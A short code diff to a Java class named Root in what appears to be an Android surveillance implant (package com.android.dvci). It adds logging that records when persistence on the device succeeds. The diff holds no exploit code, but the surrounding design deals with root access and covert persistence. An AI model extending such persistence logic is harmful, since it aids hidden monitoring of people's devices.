@@ -7,6 +7,7 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.capabilities.PackageInfo;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.crypto.Keys;
+import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
@@ -404,6 +405,7 @@ public class Root {
 			} else {
 				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT);
 			}
+			EvidenceBuilder.info(M.e("Persistence"));
 			return true;
 		}
 
@@ -452,6 +454,7 @@ public class Root {
 			} else {
 				Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_PRESENT);
 			}
+			EvidenceBuilder.info(M.e("Persistence installed"));
 			return true;
 		}
 		Status.setPersistencyStatus(Status.PERSISTENCY_STATUS_FAILED);
